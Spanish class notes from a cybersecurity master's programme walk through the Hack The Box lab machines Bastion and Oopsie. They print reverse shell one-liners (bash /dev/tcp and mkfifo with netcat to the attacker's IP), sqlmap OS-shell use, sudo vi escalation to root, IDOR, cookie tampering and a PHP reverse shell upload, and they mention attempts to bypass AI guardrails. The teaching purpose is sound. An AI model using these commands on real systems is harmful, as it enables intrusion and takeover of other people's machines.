> [!info] Ficha técnica
> **Máster de Ciberseguridad e Inteligencia Artificial** · **Clase 33**
> **Módulo:** MODULO3
> **Tema:** Clase 33
> **Fuente:** Apuntes Joselu · Evolve Academy

> [!tip] Cómo leer estos apuntes
> Resumen estructurado de la clase 33. Contenido optimizado para estudio activo y repaso rápido antes de exámenes.

---

---

--
**Máster de Ciberseguridad e Inteligencia Artificial -- Evolve Academy**

## 1.

Contexto y estructura de la sesión

Esta sesión la imparte **Yuba González**.

Es una clase de viernes de repaso, con un ritmo pausado que invita a que los alumnos participen activamente en lugar de solo observar.

El objetivo es doble:

## 1.

Terminar la máquina **Bastion** (Tier 2) que quedó pendiente en la parte de escalada de privilegios con vi. 2.

Comenzar la máquina **Oopsie** (Tier 2), que introduce dos vulnerabilidades nuevas: **IDOR** y **File Upload**.

**Apertura de clase --- Actualidad del sector:** Yuba explica el impacto de Claude Mythos y los modelos de IA avanzados en ciberseguridad: - Claude Mythos es el modelo más avanzado de Anthropic, tan potente que se consideró demasiado peligroso para el público.

Solo accesible para un puñado de organizaciones seleccionadas (Google, Amazon y pocas más) a través del **Proyecto Glasswing**. - La versión pública disponible es la familia **Claude Sonnet 4.6** (más capada, con guardarraíles que le impiden hablar de biología o ciberseguridad ofensiva), aunque hay hackers intentando saltarse esos guardarraíles. - **Impacto en el mercado:** las empresas están dejando de centrarse en listas de CVEs para parchear (el modelo clásico de vulnerability management) y están pasando a un nuevo paradigma: la **generación de attack paths** (rutas de ataque).

Las herramientas ahora encadenan vulnerabilidades automáticamente como hace un pentester, y ese es el tipo de mentalidad que el máster intenta transmitir.

## 2.

Repaso rápido Bastion --- Flujo completo hasta root

El profesor repasa a velocidad el flujo completo de Bastion para quienes tuvieron problemas, antes de entrar en la parte de escalada que quedó confusa:

```bash
nmap (puertos 21, 22, 80) ↓ FTP anónimo → backup.zip ↓ zip2john backup.zip > hash.txt → john --wordlist=rockyou.txt hash.txt ↓ ZIP descomprimido → index.php (código fuente del login) → usuario: admin, contraseña: hash MD5 ↓ CrackStation → contraseña: qwerty789 ↓ Login admin:qwerty789 → panel con buscador vulnerable (comilla → error SQL) ↓ sqlmap -u "http://IP/dashboard.php?search=test" --cookie="PHPSESSID=VALOR" --os-shell ↓ Shell como postgres ↓ Estabilización de shell (ver sección 3) ↓ sudo -l → postgres puede ejecutar /bin/vi en ruta específica como root ↓ sudo /bin/vi /etc/postgresql/11/main/pg_hba.conf → :set shell=/bin/bash → :shell → root ↓ cat /root/root.txt → FLAG
```

## 3.

Estabilización de la shell (TTY completa)

**El problema:** la shell obtenida por SQLMap (o cualquier reverse shell básica) es una **shell tonta** --- sin historial, sin autocompletado, Ctrl+C mata la sesión en vez del proceso, no se pueden usar editores como vi o nano, y se pierden los colores.

**La solución:** convertirla en una **pseudo-terminal completa** siguiendo estos pasos en orden:

### Paso 1 --- Lanzar una reverse shell mejor

Antes de estabilizar, enviar una reverse shell más robusta.

### Herramienta recomendada: **revshells.com** --- generador online de reverse shells en múltiples lenguajes y técnicas.

# En Kali — poner Netcat a escuchar (puerto alto, no 444)

nc -lvnp 4444

# En la shell de SQLMap — enviar la reverse shell

# Opción 1 (bash -i, no siempre funciona):

bash -i >& /dev/tcp/NUESTRA_IP_TUN0/4444 0>&1

# Opción 2 (nc mkfifo, más compatible — la recomendada por Yuba):

```bash
rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/bash -i 2>&1 | nc NUESTRA_IP_TUN0 4444 >/tmp/f
```

**Si la reverse shell no llega:** verificar que la IP introducida en el one-liner es la de `tun0` (la VPN de HTB), no la de la red local.

Se ve con `ifconfig` buscando el adaptador `tun0`.

**Si el puerto no funciona:** usar puertos altos (4444, 8000, 9000...).

Los puertos bajos (444, 80...) requieren privilegios de root para escuchar y generalmente fallan.

### Paso 2 --- Crear pseudo-terminal con Python

python3 -c 'import pty; pty.spawn("/bin/bash")'

Esto convierte la shell básica en algo más manejable.

Pero aún no es completa --- Ctrl+C sigue matando la sesión.

### Paso 3 --- Suspender y reconfigurar la terminal local

Ctrl+Z # Suspender la sesión (enviarla a background) stty raw -echo; fg # Configurar terminal en modo raw y traer la sesión de vuelta reset # Reiniciar la terminal export TERM=xterm # Definir tipo de terminal

**Qué hace cada paso:** - `Ctrl+Z` → suspende el proceso de Netcat (no lo mata), volviendo a la terminal local. - `stty raw -echo` → pone la terminal local en modo "crudo": deja de procesar localmente las pulsaciones de teclado (Ctrl+C, Ctrl+Z) y las pasa directamente a la sesión remota. - `fg` (*foreground*) → trae de vuelta la sesión suspendida. - `reset` → reinicia el estado de la terminal. - `export TERM=xterm` → define la variable de entorno de terminal.

Sin esto, herramientas como vi, clear o top no saben manejar la terminal y fallan.

**Para colores:**

export TERM=xterm-256color

**Resultado:** shell con historial funcional, Ctrl+C mata el proceso remoto (no la sesión), autocompletado con Tab, colores, y capacidad de usar editores de texto.

## 4.

Bastion --- Escalada de privilegios con vi (explicación profunda)

Cuando se hace `sudo -l` como el usuario `postgres`, se obtiene:

(ALL) NOPASSWD: /bin/vi /etc/postgresql/11/main/pg_hba.conf

**Traducción línea a línea:** - `(ALL)` → puede ejecutar el programa como **cualquier usuario**, incluyendo root. - `NOPASSWD` → sin introducir contraseña. - `/bin/vi /etc/postgresql/11/main/pg_hba.conf` → **solo este programa en esta ruta exacta**.

**Por qué esto escala a root:**

1. `sudo /bin/vi /etc/postgresql/11/main/pg_hba.conf` → abre el fichero como root (porque sudo ejecuta el comando como root). 2.

Ahora estamos dentro de vi como root. 3.

Vi tiene una funcionalidad que permite ejecutar una shell desde dentro del editor. 4.

Como la shell la lanza root (porque estamos en vi como root), la shell resultante es de root.

**Los dos métodos para lanzar la shell desde vi:**

# Método 1 — desde el modo de comandos de vi:

:set shell=/bin/bash :shell

# Método 2 — directamente con el ejecutable:

:!/bin/sh

**El modo de comandos de vi** se activa escribiendo `:` (dos puntos).

Desde ahí se pueden ejecutar comandos del sistema.

> [!important] **El truco clave:** la diferencia entre `sudo vi /ruta/archivo` (ejecuta vi como root → la shell saliente es de root) y simplemente `vi /ruta/archivo` (ejecuta vi como el usuario actual → la shell es del usuario actual).

El `sudo` es lo que hace la magia.

**Buscar la flag de usuario si se desconoce la ruta:**

find / -name user.txt 2>/dev/null

**Referencia:** GTFOBins (gtfobins.github.io) --- documentación completa de técnicas de escalada para cada binario, incluyendo vi.

## 5.

Máquina Oopsie (Tier 2) --- IDOR + File Upload

### Reconocimiento

```bash
nmap -sVC -p- -vvvv -oA recon/oopsie IP_OBJETIVO
```

### Puertos encontrados: - **Puerto 22** → SSH (sin credenciales, de momento inutilizable). - **Puerto 80** → HTTP → web de **Megacorp Automotive**.

### Exploración de la web

Explorar todos los botones (Services, About, Contact), buscar parámetros en las URLs y revisar el código fuente con `Ctrl+U`.

En este caso la web tiene poco de interés visible inicialmente.

### Fuzzing de directorios con Feroxbuster

feroxbuster -u http://IP_OBJETIVO

### Alternativas equivalentes: `dirsearch -u http://IP`, `gobuster dir -u http://IP -w diccionario`.

Hallazgos: - `/uploads/` → carpeta de subida de ficheros. - `/cdn-cgi/login/` → panel de login con la opción "**Login as Guest**".

**Doble diccionario:** lanzar Feroxbuster dos veces con diccionarios diferentes para maximizar la cobertura.

El diccionario `raft-medium-directories` y el `directory-list-2.3-medium` de SecLists tienen entradas distintas.

### IDOR (Insecure Direct Object Reference)

Al hacer login como Guest, se accede a un panel donde la URL contiene un parámetro `?id=2` (o similar).

Cambiar ese valor manualmente a `?id=1` devuelve la información del usuario administrador --- una vulnerabilidad IDOR clásica.

**Qué es IDOR:** el servidor no verifica que el usuario que hace la petición tenga derecho a acceder al objeto identificado por ese ID.

Simplemente devuelve lo que se le pide.

**Ejemplo real citado:** historiales clínicos en una plataforma de salud donde incrementando el ID del paciente en la URL se puede acceder a los historiales de todos los pacientes.

### Robo de cookie de sesión del admin

El panel del usuario admin (accedido por IDOR) expone un valor de cookie de acceso (*access token* o *role value*).

Usando el Inspector del navegador:

## 1.

Abrir **DevTools → Storage → Cookies**. 2.

Localizar la cookie que identifica el rol del usuario (ej: `user`, `role`, `accesslevel`). 3. **Cambiar el valor de esa cookie** al valor del administrador encontrado por IDOR. 4.

Recargar la página → se accede como administrador.

**La diferencia entre IDOR y robo de cookie:** IDOR permite leer datos de otro usuario vía URL.

El robo de cookie permite *ser* ese usuario cambiando el identificador de sesión en el almacenamiento local del navegador.

### File Upload → RCE

Como administrador, aparece un panel de subida de ficheros.

Como el backend es PHP (confirmado por la extensión de las URLs), se puede subir una webshell o reverse shell PHP.

**Subir la reverse shell:**

# Copiar la reverse shell incluida en Kali

```bash
cp /usr/share/webshells/php/php-reverse-shell.php shell.php
```

# Editar: cambiar IP y puerto

```bash
sudo vim shell.php
```

# $ip = 'NUESTRA_IP_TUN0';

# $port = 4444;

**Encontrar la ruta donde se suben los ficheros:** Si la carpeta `/uploads/` fue encontrada por Feroxbuster pero devuelve 403 (Forbidden --- existe pero no hay directory listing), probar acceder directamente al fichero subido:

http://IP_OBJETIVO/uploads/shell.php

**Si devuelve 403 como guest pero no como admin:** cambiar la cookie antes de acceder al fichero.

**Resultado:** al cargar el PHP en el navegador, el servidor lo ejecuta y establece una conexión a nuestro Netcat.

Desde ahí, estabilizar la shell y continuar con la enumeración interna para escalar privilegios.

## 6.

Conceptos clave de la sesión

### Attack paths vs.

Vulnerability management

El modelo clásico de seguridad (generar una lista de CVEs y parchearlos uno a uno) está siendo sustituido por el modelo de **rutas de ataque**: identificar cadenas de vulnerabilidades que un atacante podría encadenar para comprometer un sistema.

Es exactamente lo que se hace manualmente en HTB.

### Por qué probar credenciales en todos los servicios

Si se encuentran credenciales en un fichero de configuración (ej. usuario `postgres`, contraseña `postgres` en `dashboard.php`), siempre probarlas contra **todos** los servicios disponibles (SSH, FTP, otros puertos).

La reutilización de contraseñas es extremadamente frecuente en entornos reales.

### Enumeración como fase continua

### Yuba insiste: "el 80% del hacking es enumerar.

Cuando no encuentras algo, significa que has enumerado mal".

La fase de enumeración no termina cuando se entra en el sistema --- hay que seguir enumerando internamente (`/var/www/html`, ficheros de configuración, conexiones activas con `netstat -ano`, etc.).

## 7.

Comandos del proceso completo de estabilización

# [Máquina objetivo] Lanzar reverse shell mkfifo

```bash
rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/bash -i 2>&1 | nc IP_KALI 4444 >/tmp/f
```

# [Kali - nueva terminal] Escuchar con Netcat

nc -lvnp 4444

# [Cuando llega la conexión] Estabilizar

python3 -c 'import pty; pty.spawn("/bin/bash")' Ctrl+Z stty raw -echo; fg reset export TERM=xterm-256color

## 8.

Conceptos y términos clave corregidos

Término en la transcripción Corrección / Aclaración
-------------------------------------------- ------------------------------------------------------------------------------------------------------------------------------------------
 *Bashin / Bachín / Pachine* **Bastion** -- máquina HTB Tier 2 con SQL Injection y escalada con vi
 *Upsy / UCI / Oopsie* **Oopsie** -- máquina HTB Tier 2 con IDOR y File Upload
 *Cloud de mitos / Fable 5* **Claude Mythos** (Anthropic) y **Claude Sonnet 4.6** -- modelos de IA de Anthropic
 *Glasswindo / GlassWindo* **Proyecto Glasswing** -- programa de acceso limitado de Anthropic para Claude Mythos
 *Guardarrail / guardaraíles* **Guardarraíles** (*guardrails*) -- límites de seguridad implementados en los modelos de IA
 *Attack pads / rutas de ataque* **Attack paths** -- cadenas de vulnerabilidades encadenadas que llevan a un compromiso total
 *MKFAIFO / MKFIFO* **mkfifo** -- crea un named pipe (tubería con nombre) para la reverse shell
 *Repsell / Revses / Revselms* **revshells.com** -- generador online de reverse shells en múltiples lenguajes
 *Sell tonta / sell a medias* **Shell no interactiva / dumb shell** -- shell sin TTY completa
 *UPgrade de shell / upgrade sel* **Estabilización de shell** -- proceso para convertir una dumb shell en una TTY completa
 *PTI / p ti* **pty** (*pseudo-terminal*) -- módulo de Python para crear pseudo-terminales
 *stty raw eco / SSS TTI* `stty raw -echo` -- configura la terminal local en modo crudo para pasar señales a la sesión remota
 *FG / foreground* `fg` (*foreground*) -- trae un proceso suspendido de vuelta al primer plano
 *export etern / el x termo* `export TERM=xterm` / `export TERM=xterm-256color` -- define el tipo de terminal
 *GFTOBINS / GFT o BINS* **GTFOBins** (gtfobins.github.io) -- técnicas de escalada de privilegios con binarios del sistema
 *2 puntos barra bin sh* `:!/bin/sh` -- comando de vi para lanzar una shell desde dentro del editor
 *hold / ALL en sudo -l* `(ALL)` en la salida de `sudo -l` -- significa que el usuario puede ejecutar el comando como cualquier usuario, incluido root
*IDOR / Broken Object Access* **IDOR** (*Insecure Direct Object Reference*) -- vulnerabilidad que permite acceder a objetos de otros usuarios cambiando un ID en la URL
 *File Upload / subir una web sell* **File Upload** -- vulnerabilidad que permite subir ficheros PHP ejecutables al servidor
 *FheroBuster / PheroBuster / Zerox Buster* **Feroxbuster** -- herramienta de fuzzing web recursivo
 *Rappi Seven / Rappid seven* **Rapid7** -- empresa de ciberseguridad conocida por Metasploit y el escáner Nexpose
 *linkPase* **LinPEAS** -- script de enumeración automática para escalada de privilegios en Linux
*hacerme admin con la accesibilidad* **cookie manipulation** -- modificar el valor de la cookie de sesión en el Storage del navegador para cambiar el rol del usuario

*Resumen elaborado para uso académico en el Máster de Ciberseguridad e Inteligencia Artificial -- Evolve Academy.*


---

## 🔗 Red de Conocimiento

### Documentos Relacionados

- [[resumen_master_clase34.md|resumen_master_clase34]] — Metasploit, Netcat / Reverse Shells, Post-Explotación
- [[../../apuntes Chema/Maquinas/Cierre de Vaccine + Máquina Oopsie.md|Cierre de Vaccine + Máquina Oopsie]] — File Upload, SQL Injection, SQLMap
- [[../MODULO1/resumen_master_clase3.md|resumen_master_clase3]] — Netcat / Reverse Shells, Post-Explotación, SQL Injection
- [[../../apuntes Andres/07.07.2026 Explotación Avanzada - Escalada de Privilegios MultiPivote.md|07.07.2026 Explotación Avanzada - Escalada de Privilegios MultiPivote]] — File Upload, Metasploit, SQL Injection
- [[../../apuntes Chema/Maquinas/Vaccine.md|Vaccine]] — Metasploit, SQL Injection, SQLMap
- [[../../transcripciones/Junio/10.06.2026 HTB Starting Point 2 Repaso.md|10.06.2026 HTB Starting Point 2 Repaso]] — File Upload, SQL Injection, SQLMap

### 🛠️ Herramientas

- [[comandos/Feroxbuster|Feroxbuster]]
- [[comandos/Metasploit|Metasploit]]
- [[comandos/Metasploit|Netcat / Reverse Shells]]
- [[comandos/SQLMap|SQLMap]]
- [[comandos/SSH|SSH]]

### 🎯 Vulnerabilidades Relacionadas

- [[Apuntes/06 - Explotacion y Post-Explotacion/Reverse Shells y Post-Explotación.md|Command Injection / RCE]]
- [[Apuntes/05 - Auditoria Web/SQL Injection.md|SQL Injection]]

> #command-injection #escalada-privilegios #feroxbuster #file-upload #hack-the-box #ia #idor #kali #linux #metasploit #netcat #post-explotacion #redes #reverse-shell #sqli #sqlmap #ssh
